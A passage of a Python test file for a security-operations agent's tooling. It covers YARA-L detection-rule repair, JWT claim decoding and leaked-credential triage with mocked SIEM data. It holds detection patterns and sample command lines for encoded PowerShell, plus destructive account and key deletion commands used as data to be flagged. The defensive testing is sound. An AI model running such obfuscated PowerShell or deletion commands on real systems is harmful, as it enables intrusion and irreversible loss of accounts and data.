            r'array_distinct(re.capture($e.target.process.command_line, "(-(?:enc|encodedcommand|nop|e)\\b)"))',
        ),
        (
            "invalid_re_capture_syntax",
            r'regexp_extract($e.command_line, "https?://([^/\s]+)")',
            r'array_distinct(re.capture($e.target.process.command_line, "https?://([^/\\s]+)"))',
        ),
        (
            "invalid_re_capture_syntax",
            r're.capture($e.process.command_line, "DERPService\.exe")',
            r'array_distinct(re.capture($e.target.process.command_line, "(DERPService\\.exe)"))',
        ),
    ]
    for f in findings:
        assert doc_text[f["start_index"] - 1 : f["end_index"] - 1] == f["quote"]


def test_extract_yaral2_event_predicates_disjunctions_and_reference_lists() -> None:
    """H18 Suite 4: Verifies that ``extract_yaral2_event_predicates()`` and
    ``extract_yaral2_event_streams()`` preserve ``(principal.ip = "104.198.226.161" OR principal.ip = "34.135.255.85")``
    in the synthesized retrohunt UDM query while recording and cleanly stripping
    ``%<list_name>`` reference list predicates so Chronicle ``search_udm`` succeeds.
    """
    from manager.tools.docs_review_tools import (
        extract_yaral2_event_predicates,
        extract_yaral2_event_streams,
        extract_yaral2_multi_event_spec,
    )

    rule_text = (
        'rule gcp_sa_disjunction_and_ref_list {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    ($e.principal.ip = "104.198.226.161" or $e.principal.ip = "34.135.255.85")\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip in %suspicious_ips\n'
        '    not $e.principal.ip in cidr %corp_cidrs\n'
        '  condition:\n'
        '    $e\n'
        '}'
    )
    preds = extract_yaral2_event_predicates(rule_text)
    clauses = [p["udm_clause"] for p in preds]
    assert clauses == [
        'metadata.log_type = "GCP_CLOUDAUDIT"',
        '(principal.ip = "104.198.226.161" OR principal.ip = "34.135.255.85")',
        'target.resource.name = "projects/base-production"',
    ]
    spec = extract_yaral2_multi_event_spec(rule_text)
    assert spec["reference_lists"] == ["%suspicious_ips", "%corp_cidrs"]
    streams = extract_yaral2_event_streams(rule_text)
    assert streams["reference_lists"] == ["%suspicious_ips", "%corp_cidrs"]
    assert (
        streams["per_event_udm_queries"]["$e"]
        == 'metadata.log_type = "GCP_CLOUDAUDIT" AND (principal.ip = "104.198.226.161" OR principal.ip = "34.135.255.85") AND target.resource.name = "projects/base-production"'
    )


def test_evaluate_yaral2_outcome_thresholds_with_strings_coalesce_and_re_capture() -> None:
    """H18 Suite 5: Verifies empirical computation of ``strings.coalesce(...)``,
    ``strings.concat(...)``, ``strings.to_lower(...)``, and ``re.capture(...)``
    against sample UDM events (both single-event and multi-event ``array_distinct(...)``).
    """
    from manager.tools.docs_review_tools import evaluate_yaral2_outcome_thresholds

    rule_text = (
        'rule wins_d19_outcome_functions {\n'
        '  meta:\n'
        '    author = "SecOps"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    $e.principal.hostname = $host\n'
        '  match:\n'
        '    $host over 15m\n'
        '  outcome:\n'
        '    $risk_score = max(95)\n'
        '    $actor_user = array_distinct(strings.coalesce($e.principal.user.userid, $e.target.user.userid, "unknown"))\n'
        '    $host_actor = array_distinct(strings.concat(strings.to_lower($e.principal.hostname), ":", $e.principal.user.userid))\n'
        '    $ps_flag = array_distinct(re.capture($e.target.process.command_line, "(-(?:enc|encodedcommand|nop|e)\\\\b)"))\n'
        '  condition:\n'
        '    $e and $risk_score >= 80\n'
        '}'
    )
    retrohunt_res = {
        "events": [
            {
                "udm": {
                    "principal": {
                        "hostname": "WINS-D19",
                        "user": {"userid": "lisawalker"},
                    },
                    "target": {
                        "process": {
                            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -w 1 -enc SQBFAFgA"
                        }
                    },
                }
            },
            {
                "udm": {
                    "principal": {
                        "hostname": "wins-d19",
                        "user": {"userid": ""},
                    },
                    "target": {
                        "user": {"userid": "administrator"},
                        "process": {
                            "command_line": "powershell.exe -e JABzAD0A"
                        },
                    },
                }
            },
        ],
        "total_events": 2,
    }
    eval_res = evaluate_yaral2_outcome_thresholds(rule_text, retrohunt_res)
    assert eval_res["threshold_suppressed"] is False
    assert eval_res["outcome_values"]["$risk_score"] == 95
    computed = eval_res["computed_string_outcomes"]
    assert computed["$actor_user"] == ["lisawalker", "administrator"]
    assert computed["$host_actor"] == ["wins-d19:lisawalker", "wins-d19:"]
    assert computed["$ps_flag"] == ["-enc", "-e"]


def test_verify_and_repair_yaral2_rules_in_doc_h18_end_to_end() -> None:
    """H18 Suite 6: End-to-end test via ``httpx.MockTransport`` verifying UTF-16 span
    accuracy, comment-first ordering, descending ``startIndex`` ``writeMode="SUGGEST"``
    batching, summary counters (``yaral2_in_membership_repaired``,
    ``yaral2_reference_lists_repaired``, ``yaral2_strings_functions_repaired``,
    ``yaral2_re_capture_repaired``), and Pass 2 idempotency
    (``skipped_existing_suggestion_count``).
    """
    from manager.tools.docs_review_tools import (
        clear_doc_index_cache,
        verify_and_repair_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        'rule gcp_sa_in_tuple_and_coalesce_case_33278 {\n'
        '  meta:\n'
        '    author = "SecOps Autonomous Agent"\n'
        '    severity = "HIGH"\n'
        '    runbook_skill = "compromised-user-account-response"\n'
        '  events:\n'
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.ip in ("104.198.226.161", "34.135.255.85")\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip = $src_ip\n'
        '  match:\n'
        '    $src_ip over 15m\n'
        '  outcome:\n'
        '    $risk_score = max(85)\n'
        '    $actor_identity = coalesce($e.user.userid, $e.ip, "unknown")\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_ref_list_and_re_capture_case_33269 {\n'
        '  meta:\n'
        '    author = "SecOps Autonomous Agent"\n'
        '    severity = "CRITICAL"\n'
        '    runbook_skill = "malware-incident-response"\n'
        '  events:\n'
        '    $e.principal.hostname = "wins-d19"\n'
        '    $e.principal.hostname in suspicious_windows_hosts\n'
        '    re.regex($e.target.process.command_line, `.*powershell.*`) nocase\n'
        '    $e.principal.hostname = $host\n'
        '  match:\n'
        '    $host over 15m\n'
        '  outcome:\n'
        '    $risk_score = max(95)\n'
        '    $ps_flag = regex_extract($e.process.command_line, /-(?:enc|encodedcommand|nop|e)\\b/)\n'
        '  condition:\n'
        '    $e\n'
        '}\n\n'
        'rule wins_d19_derpservice_lower_concat_case_33269 {\n'
        '  meta:\n'
        '    author = "SecOps Autonomous Agent"\n'
        '    severity = "CRITICAL"\n'
        '    runbook_skill = "malware-incident-response"\n'
        '  events:\n'
        '    lower($e.hostname) = "wins-d19"\n'
        '    $e.principal.ip = %active_directory_tier0_hosts\n'
        '    re.regex($e.target.process.command_line, `.*DERPService.*`) nocase\n'
        '    $e.principal.hostname = $host\n'
        '  match:\n'
        '    $host over 15m\n'
        '  outcome:\n'
        '    $risk_score = max(90)\n'
        '    $actor_summary = concat($e.hostname, ":", $e.user.userid)\n'
        '  condition:\n'
        '    $e\n'
        '}\n'
    )

    mock_doc = _make_single_paragraph_doc(
        "doc-h18-e2e", "Cycle 14 H18 E2E", doc_text
    )
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h18-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_search(query: str, start_time: str, end_time: str, max_events: int) -> dict[str, Any]:
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {
                                    "userid": "294955789222-compute@developer.gserviceaccount.com"
                                },
                            },
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        if "powershell" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {
                                "hostname": "wins-d19",
                                "user": {"userid": "lisawalker"},
                            },
                            "target": {
                                "process": {
                                    "command_line": "powershell.exe -NoP -enc SQBFAFgA"
                                }
                            },
                        }
                    }
                ],
                "total_events": 5,
            }
        return {
            "events": [
                {
                    "udm": {
                        "principal": {
                            "hostname": "wins-d19",
                            "user": {"userid": "lisawalker"},
                        },
                        "target": {
                            "process": {
                                "command_line": "C:\\Users\\Administrator\\DERPService.exe"
                            }
                        },
                    }
                }
            ],
            "total_events": 1,
        }

    res = verify_and_repair_yaral2_rules_in_doc(
        "doc-h18-e2e",
        run_live_siem_check=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["yaral2_findings_count"] == 7
    assert res["yaral2_in_membership_repaired"] == 1
    assert res["yaral2_reference_lists_repaired"] == 2
    assert res["yaral2_strings_functions_repaired"] == 3
    assert res["yaral2_re_capture_repaired"] == 1
    assert res["comments"]["inserted_count"] == 7
    assert res["edits"]["applied_count"] == 7
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency
    mock_doc_pass2 = {
        "documentId": "doc-h18-e2e",
        "title": "Cycle 14 H18 E2E",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h18.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = verify_and_repair_yaral2_rules_in_doc(
        "doc-h18-e2e",
        run_live_siem_check=True,
        siem_validate_fn=lambda rule_str: {"success": True, "message": "OK"},
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pass2)),
    )
    assert res2["yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 7
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0


# ---------------------------------------------------------------------------
# Cycle 15 (H13): Automated Leaked Credential Blast-Radius Triage, Safe JWT
# Claim Extraction & Emergency Revocation Playbook Stager in Google Docs
# ---------------------------------------------------------------------------


def _build_test_jwt(header: dict[str, Any], payload: dict[str, Any], signature: str = "FakeSig9876543210abcdef") -> str:
    """Builds a synthetic 3-segment JWT string for hermetic unit testing."""
    import base64

    h_b64 = (
        base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        .decode("ascii")
        .rstrip("=")
    )
    p_b64 = (
        base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        .decode("ascii")
        .rstrip("=")
    )
    return f"{h_b64}.{p_b64}.{signature}"


def test_decode_jwt_safe_claims_and_extract_leaked_credential_inventories():
    """Verifies pure-Python Base64URL decoding of non-secret JWT header/payload
    claims without exposing signatures, and verifies ``extract_leaked_credential_inventories``
    across raw and ``<REDACTED_...:sha256=...>`` tokens with correlated service
    accounts, Workspace users, source IPs, and GCP projects."""
    from manager.tools.docs_review_tools import (
        DEFAULT_AWS_ACCESS_KEY_ROTATE_DOC_URL,
        DEFAULT_GCP_SA_DISABLE_DOC_URL,
        DEFAULT_WORKSPACE_USER_SUSPEND_DOC_URL,
        decode_jwt_safe_claims,
        extract_leaked_credential_inventories,
    )

    secret_sig = "SuperSecretSignatureBytesDoNotLeak1234567890"
    jwt_token = _build_test_jwt(
        {"alg": "RS256", "kid": "1a2b3c4d5e", "typ": "JWT"},
        {
            "iss": "https://accounts.google.com",
            "sub": "294955789222-compute@developer.gserviceaccount.com",
            "email": "294955789222-compute@developer.gserviceaccount.com",
            "aud": "https://cloudresourcemanager.googleapis.com/",
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "exp": 1770508800,
            "private_secret_claim": "should_never_be_extracted",
        },
        signature=secret_sig,
    )

    claims = decode_jwt_safe_claims(jwt_token)
    assert claims["valid_jwt"] is True
    assert claims["signature_redacted"] is True
    assert claims["alg"] == "RS256"
    assert claims["kid"] == "1a2b3c4d5e"
    assert claims["typ"] == "JWT"
    assert claims["sub"] == "294955789222-compute@developer.gserviceaccount.com"
    assert claims["email"] == "294955789222-compute@developer.gserviceaccount.com"
    assert claims["iss"] == "https://accounts.google.com"
    assert claims["aud"] == "https://cloudresourcemanager.googleapis.com/"
    assert claims["scope"] == "https://www.googleapis.com/auth/cloud-platform"
    assert claims["service_account_email"] == "294955789222-compute@developer.gserviceaccount.com"
    assert "private_secret_claim" not in json.dumps(claims)
    assert secret_sig not in json.dumps(claims)
    assert jwt_token not in json.dumps(claims)

    doc_text = (
        "# Incident Postmortem: Multi-Cloud & Workspace Credential Exposure\n\n"
        "## Finding 1: Unredacted OIDC JWT Bearer Token (Case 33278)\n"
        f"- Captured Authorization header from 104.198.226.161 targeting projects/base-production: Bearer {jwt_token}\n\n"
        "## Finding 2: Already-Redacted GCP OAuth2 Access Token\n"
        "- Stolen token `<REDACTED_GCP_TOKEN:sha256=89abcdef0123>` used by hello@base-production.iam.gserviceaccount.com from 104.198.226.161.\n\n"
        "## Finding 3: Workspace Admin Session Token (Case 33287)\n"
        "- Compromised Workspace session `<REDACTED_JWT:sha256=fedcba987654>` for admin@mydomain.com from source IP 79.154.246.114.\n\n"
        "## Finding 4: Leaked AWS IAM Access Key\n"
        "- Found key AKIAIOSFODNN7EXAMPLE in build log.\n"
    )
    mock_doc = _make_single_paragraph_doc("doc-cred-inv", "Credential Inventory", doc_text)
    plain, idx_map = _extract_text_and_index_map(mock_doc)

    inv = extract_leaked_credential_inventories(plain, idx_map)
    assert len(inv) == 4
    serialized_inv = json.dumps(inv)
    assert secret_sig not in serialized_inv
    assert jwt_token not in serialized_inv

    c0 = inv[0]
    assert c0["credential_type"] == "jwt_bearer_token"
    assert c0["is_redacted"] is False
    assert c0["service_account_email"] == "294955789222-compute@developer.gserviceaccount.com"
    assert c0["source_ip"] == "104.198.226.161"
    assert c0["gcp_project"] == "projects/base-production"
    assert c0["jwt_claims"]["kid"] == "1a2b3c4d5e"
    assert (
        c0["recommended_revocation_command"]
        == "gcloud iam service-accounts disable 294955789222-compute@developer.gserviceaccount.com"
    )
    assert c0["reference_url"] == DEFAULT_GCP_SA_DISABLE_DOC_URL

    c1 = inv[1]
    assert c1["credential_type"] == "gcp_oauth_token"
    assert c1["is_redacted"] is True
    assert c1["service_account_email"] == "hello@base-production.iam.gserviceaccount.com"
    assert c1["gcp_project"] == "projects/base-production"
    assert (
        c1["recommended_revocation_command"]
        == "gcloud iam service-accounts disable hello@base-production.iam.gserviceaccount.com"
    )

    c2 = inv[2]
    assert c2["credential_type"] == "jwt_bearer_token"
    assert c2["is_redacted"] is True
    assert c2["workspace_user_email"] == "admin@mydomain.com"
    assert c2["source_ip"] == "79.154.246.114"
    assert c2["recommended_revocation_command"] == "gam user admin@mydomain.com suspend"
    assert c2["reference_url"] == DEFAULT_WORKSPACE_USER_SUSPEND_DOC_URL

    c3 = inv[3]
    assert c3["credential_type"] == "aws_access_key_id"
    assert c3["is_redacted"] is False
    assert c3["aws_key_id_masked"] == "AKIAIOSF...MPLE"
    assert (
        c3["recommended_revocation_command"]
        == "aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive"
    )
    assert c3["reference_url"] == DEFAULT_AWS_ACCESS_KEY_ROTATE_DOC_URL


def test_find_leaked_credential_containment_spans_repairs_destructive_and_local_only_cli():
    """Verifies 1-based UTF-16 span detection and replacement across
    ``destructive_service_account_delete``, ``local_only_gcloud_auth_revoke``,
    ``destructive_workspace_user_delete``, and ``destructive_aws_access_key_delete``."""
    from manager.tools.docs_review_tools import (
        DEFAULT_AWS_ACCESS_KEY_ROTATE_DOC_URL,
        DEFAULT_GCP_SA_DISABLE_DOC_URL,
        DEFAULT_WORKSPACE_USER_SUSPEND_DOC_URL,
        find_leaked_credential_containment_spans,
    )

    doc_text = (
        "# Containment Playbook Draft\n\n"
        "## 1. GCP Service Account Compromise (Case 33278)\n"
        "- Principal: 294955789222-compute@developer.gserviceaccount.com\n"
        "- Step 1a (Destructive SA Delete): `gcloud iam service-accounts delete 294955789222-compute@developer.gserviceaccount.com`\n"
        "- Step 1b (Local-Only Workstation Revoke): `gcloud auth revoke 294955789222-compute@developer.gserviceaccount.com`\n\n"
        "## 2. Google Workspace Admin Takeover (Case 33287)\n"
        "- Step 2a (Destructive User Delete): `gam user admin@mydomain.com delete`\n\n"
        "## 3. AWS IAM Access Key Exposure\n"
        "- Step 3a (Destructive Key Delete): `aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --user-name ci-deployer`\n"
    )
    mock_doc = _make_single_paragraph_doc("doc-containment-cli", "Containment CLI Test", doc_text)
    plain, idx_map = _extract_text_and_index_map(mock_doc)

    comments, edits, findings = find_leaked_credential_containment_spans(
        plain,
        idx_map,
        redact_unredacted_credentials=True,
        synthesize_missing_revocation=False,
    )

    assert len(findings) == 4
    assert len(comments) == 4
    assert len(edits) == 4

    by_type = {f["defect_type"]: f for f in findings}
    assert set(by_type.keys()) == {
        "destructive_service_account_delete",
        "local_only_gcloud_auth_revoke",
        "destructive_workspace_user_delete",
        "destructive_aws_access_key_delete",
    }

    sa_del = by_type["destructive_service_account_delete"]
    assert (
        sa_del["replacement"]
        == "gcloud iam service-accounts disable 294955789222-compute@developer.gserviceaccount.com"
    )
    assert sa_del["reference_url"] == DEFAULT_GCP_SA_DISABLE_DOC_URL
    assert (
        plain[sa_del["start_index"] - 1 : sa_del["end_index"] - 1]
        == "gcloud iam service-accounts delete 294955789222-compute@developer.gserviceaccount.com"
    )

    local_rev = by_type["local_only_gcloud_auth_revoke"]
    assert (
        local_rev["replacement"]
        == "gcloud iam service-accounts disable 294955789222-compute@developer.gserviceaccount.com"
    )
    assert local_rev["reference_url"] == DEFAULT_GCP_SA_DISABLE_DOC_URL

    ws_del = by_type["destructive_workspace_user_delete"]
    assert ws_del["replacement"] == "gam user admin@mydomain.com suspend"
    assert ws_del["reference_url"] == DEFAULT_WORKSPACE_USER_SUSPEND_DOC_URL

    aws_del = by_type["destructive_aws_access_key_delete"]
    assert (
        aws_del["replacement"]
        == "aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive --user-name ci-deployer"
    )
    assert aws_del["reference_url"] == DEFAULT_AWS_ACCESS_KEY_ROTATE_DOC_URL


def test_find_leaked_credential_containment_spans_synthesizes_missing_revocation_without_overlap():
    """Verifies that when ``synthesize_missing_revocation=True``, credentials
    lacking a revocation command in the document receive
    ``[Emergency Revocation: `<canonical_cli_command>`]`` without producing
    overlapping UTF-16 edit spans."""
    from manager.tools.docs_review_tools import (
        _spans_overlap,
        find_leaked_credential_containment_spans,
    )

    ya29_raw = "ya29" + ".a0AXooCgv9FakeAccessTokenForTesting1234567890abcdef"
    doc_text = (
        "# Incident Timeline\n\n"
        "## Section A: Unredacted GCP Token without Revocation Command\n"
        f"- Compromised SA `hello@base-production.iam.gserviceaccount.com` used token `{ya29_raw}` from `104.198.226.161`.\n\n"
        "## Section B: Already-Redacted Workspace Token without Revocation Command\n"
        "- Compromised Workspace admin `admin@mydomain.com` session `<REDACTED_JWT:sha256=deadbeef1234>` from `79.154.246.114`.\n"
    )
    mock_doc = _make_single_paragraph_doc("doc-synth-rev", "Synthesize Revocation Test", doc_text)
    plain, idx_map = _extract_text_and_index_map(mock_doc)

    comments, edits, findings = find_leaked_credential_containment_spans(
        plain,
        idx_map,
        redact_unredacted_credentials=True,
        synthesize_missing_revocation=True,
    )

    # Exactly 2 non-overlapping edit spans (one for Section A's token, one for Section B's token)
    assert len(edits) == 2
    assert len(comments) == 2
    assert not _spans_overlap(
        (edits[0]["start_index"], edits[0]["end_index"]),
        (edits[1]["start_index"], edits[1]["end_index"]),
    )

    assert "<REDACTED_GCP_TOKEN:sha256=" in edits[0]["replacement"]
    assert (
        "[Emergency Revocation: `gcloud iam service-accounts disable hello@base-production.iam.gserviceaccount.com`]"
        in edits[0]["replacement"]
    )
    assert (
        edits[1]["replacement"]
        == "<REDACTED_JWT:sha256=deadbeef1234> [Emergency Revocation: `gam user admin@mydomain.com suspend`]"
    )

    defect_types = {f["defect_type"] for f in findings}
    assert "unredacted_leaked_credential" in defect_types
    assert "missing_credential_revocation_command" in defect_types


def test_triage_leaked_credential_with_siem_aggregates_cloud_audit_and_workspace_blast_radius():
    """Verifies Chronicle SIEM UDM query construction and event aggregation
    (``SetIamPolicy``, ``cloudsql.instances.delete``,
    ``DELETE_SAML2_SERVICE_PROVIDER_CONFIG``) across ``GCP_CLOUDAUDIT`` and
    ``WORKSPACE_ACTIVITY`` events while sanitizing telemetry strings."""
    from manager.tools.docs_review_tools import triage_leaked_credential_with_siem

    executed_queries: list[str] = []

    def fake_siem_search(
        query: str,
        start_time: str = "",
        end_time: str = "",
        max_events: int = 20,
    ) -> dict[str, Any]:
        executed_queries.append(query)
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "eventType": "USER_RESOURCE_UPDATE_PERMISSIONS",
                                "logType": "GCP_CLOUDAUDIT",
                                "productEventType": "SetIamPolicy",
                            },
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {
                                    "emailAddresses": [
                                        "294955789222-compute@developer.gserviceaccount.com"
                                    ]
                                },
                            },
                            "securityResult": [
                                {
                                    "about": {
                                        "email": [
                                            "hello@base-production.iam.gserviceaccount.com"
                                        ]
                                    }
                                }
                            ],
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    },
                    {
                        "udm": {
                            "metadata": {
                                "eventType": "USER_RESOURCE_DELETE",
                                "logType": "GCP_CLOUDAUDIT",
                                "productEventType": "cloudsql.instances.delete",
                            },
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {
                                    "emailAddresses": [
                                        "294955789222-compute@developer.gserviceaccount.com"
                                    ]
                                },
                            },
                            "target": {
                                "resource": {
                                    "name": "projects/base-production/instances/prod-db-01"
                                }
                            },
                        }
                    },
                ]
            }
        return {
            "events": [
                {
                    "udm": {
                        "metadata": {
                            "eventType": "USER_UNCATEGORIZED",
                            "logType": "WORKSPACE_ACTIVITY",
                            "productEventType": "DELETE_SAML2_SERVICE_PROVIDER_CONFIG",
                        },
                        "principal": {
                            "ip": ["79.154.246.114"],
                            "user": {"emailAddresses": ["admin@mydomain.com"]},
                        },
                        "target": {"application": "Admin Console"},
                    }
                }
            ]
        }

    gcp_res = triage_leaked_credential_with_siem(
        {
            "credential_type": "jwt_bearer_token",
            "service_account_email": "294955789222-compute@developer.gserviceaccount.com",
            "principal_email": "294955789222-compute@developer.gserviceaccount.com",
            "source_ip": "104.198.226.161",
            "gcp_project": "projects/base-production",
        },
        siem_search_fn=fake_siem_search,
    )
    assert gcp_res["status"] == "success"
    assert gcp_res["siem_verified"] is True
    assert gcp_res["events_matched"] == 2
    assert "SetIamPolicy" in gcp_res["observed_actions"]
    assert "cloudsql.instances.delete" in gcp_res["observed_actions"]
    assert (
        "294955789222-compute@developer.gserviceaccount.com"
        in gcp_res["observed_principals"]
    )
    assert (
        "hello@base-production.iam.gserviceaccount.com"
        in gcp_res["observed_principals"]
    )
    assert "104.198.226.161" in gcp_res["observed_ips"]
    assert "projects/base-production" in gcp_res["target_resources"]
    assert "[SIEM Credential Blast-Radius Triage: 2 event(s) matched" in gcp_res["summary"]

    ws_res = triage_leaked_credential_with_siem(
        {
            "credential_type": "jwt_bearer_token",
            "workspace_user_email": "admin@mydomain.com",
            "principal_email": "admin@mydomain.com",
            "source_ip": "79.154.246.114",
        },
        siem_search_fn=fake_siem_search,
    )
    assert ws_res["status"] == "success"
    assert ws_res["siem_verified"] is True
    assert ws_res["events_matched"] == 1
    assert "DELETE_SAML2_SERVICE_PROVIDER_CONFIG" in ws_res["observed_actions"]
    assert "admin@mydomain.com" in ws_res["observed_principals"]
    assert "79.154.246.114" in ws_res["observed_ips"]


def test_triage_and_redline_leaked_credentials_in_doc_end_to_end_and_stage_a_integration():
    """Verifies ``triage_and_redline_leaked_credentials_in_doc`` executes
    ``insertComment`` before descending-index ``writeMode="SUGGEST"`` batchUpdate,
    enriches comments with ``[SIEM Credential Blast-Radius Triage: ...]`` badges,
    enforces Pass 2 suggestion idempotency, integrates with
    ``review_google_doc_with_stage_a`` (``stage_a_credential_containment_count``),
    and exposes an ADK ``FunctionTool`` declaration."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import (
        review_google_doc_with_stage_a,
        triage_and_redline_leaked_credentials_in_doc,
    )

    jwt_tok = _build_test_jwt(
        {"alg": "RS256", "kid": "key-compute-01", "typ": "JWT"},
        {
            "iss": "https://accounts.google.com",
            "sub": "294955789222-compute@developer.gserviceaccount.com",
            "email": "294955789222-compute@developer.gserviceaccount.com",
            "scope": "https://www.googleapis.com/auth/cloud-platform",
        },
    )
    doc_text = (
        "# Incident Response Report: Case 33278 & Case 33287\n\n"
        "## 1. Compromised GCP Compute Service Account (Case 33278)\n"
        f"- Captured JWT bearer token from 104.198.226.161 on projects/base-production: {jwt_tok}\n"
        "- Proposed containment: `gcloud iam service-accounts delete 294955789222-compute@developer.gserviceaccount.com`\n"
        "- Secondary analyst step: `gcloud auth revoke`\n\n"
        "## 2. Compromised Workspace Admin Account (Case 33287)\n"
        "- Redacted token `<REDACTED_JWT:sha256=abcdef012345>` used by admin@mydomain.com from 79.154.246.114.\n"
        "- Proposed containment: `gam user admin@mydomain.com delete`\n\n"
        "## 3. Secondary GCP Token Missing Revocation Playbook Step\n"
        "- Leaked token `<REDACTED_GCP_TOKEN:sha256=112233445566>` for hello@base-production.iam.gserviceaccount.com from 104.198.226.161.\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-h13-e2e", "Cycle 15 H13 E2E Test", doc_text
    )
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h13-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_siem_search(query: str, **_kwargs: Any) -> dict[str, Any]:
        if "WORKSPACE_ACTIVITY" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "eventType": "USER_UNCATEGORIZED",
                                "logType": "WORKSPACE_ACTIVITY",
                                "productEventType": "DELETE_SAML2_SERVICE_PROVIDER_CONFIG",
                            },
                            "principal": {
                                "ip": ["79.154.246.114"],
                                "user": {"emailAddresses": ["admin@mydomain.com"]},
                            },
                        }
                    }
                ]
            }
        return {
            "events": [
                {
                    "udm": {
                        "metadata": {
                            "eventType": "USER_RESOURCE_UPDATE_PERMISSIONS",
                            "logType": "GCP_CLOUDAUDIT",
                            "productEventType": "SetIamPolicy",
                        },
                        "principal": {
                            "ip": ["104.198.226.161"],
                            "user": {
                                "emailAddresses": [
                                    "294955789222-compute@developer.gserviceaccount.com"
                                ]
                            },
                        },
                        "target": {"resource": {"name": "projects/base-production"}},
                    }
                }
            ]
        }

    res = triage_and_redline_leaked_credentials_in_doc(
        "doc-h13-e2e",
        run_live_siem_check=True,
        redact_unredacted_credentials=True,
        synthesize_missing_revocation=True,
        siem_search_fn=fake_siem_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )

    assert res["status"] == "success"
    assert res["credential_count"] == 3
    # 5 edits: 1 unredacted JWT + 1 SA delete + 1 gcloud auth revoke + 1 gam user delete + 1 missing revocation on hello@...
    assert res["finding_count"] == 5
    assert res["comments"]["inserted_count"] == 5
    assert res["edits"]["applied_count"] == 5
    assert len(res["siem_triage_results"]) == 3
    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}

    comment_bodies = [
        req["insertComment"]["content"] for req in batch_calls[0]["requests"]
    ]
    assert any(
        "[SIEM Credential Blast-Radius Triage:" in body for body in comment_bodies
    )
    assert any("key-compute-01" in body for body in comment_bodies)

    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency
    mock_doc_pass2 = {
        "documentId": "doc-h13-e2e",
        "title": "Cycle 15 H13 E2E Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h13.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
